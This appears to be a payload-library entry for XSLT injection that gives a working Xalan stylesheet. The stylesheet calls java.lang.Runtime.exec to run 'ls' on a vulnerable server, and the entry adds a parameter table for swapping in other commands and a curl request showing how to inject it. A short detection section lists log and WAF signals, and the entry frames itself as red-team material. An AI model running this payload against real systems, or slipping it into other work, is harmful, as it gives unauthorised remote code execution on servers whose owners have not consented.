---
id: d9475154-04f1-414a-ac3a-2c83f639caef
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.581703+00:00'
updated_at: '2023-04-10T20:24:51.179803+00:00'
tags:
  - xslt-injection
  - rce
  - java-runtime
platforms:
  - Web
  - Java
validated: true
---

# XSLT-List-Files-via-Java-Runtime

## Code

```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
```

## Description

This XSLT payload exploits a vulnerable Xalan Java processor to execute the 'ls' command (or 'dir' on Windows) via java.lang.Runtime.getRuntime().exec(). It lists files in the current directory and returns the output as a string in the transformation result, confirming RCE capability.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'ls' | System command to execute (adapt for OS: 'dir' on Windows) | 'ls -la' |

## Usage

Inject this as the XSLT stylesheet in a POST request to a vulnerable XML transformation endpoint. For example, using curl: `curl -X POST -d '<xml>input</xml>' -H 'Content-Type: application/xml' http://target.com/transform?xslt=payload.xml`. Use in red team engagements to enumerate server files after discovering XSLT Injection.

## Detection

- Monitor XSLT processor logs for invocations of java.lang.Runtime or unexpected namespaces like 'http://xml.apache.org/xalan/java'.
- WAF rules to block XSLT inputs containing 'java.lang' or 'Runtime'.
- Server-side command execution logs showing 'ls' or similar without user input.
- Network anomalies from repeated transformation requests.

## Related

- [[procedures/XSLT-Injection-for-Java-RCE]]
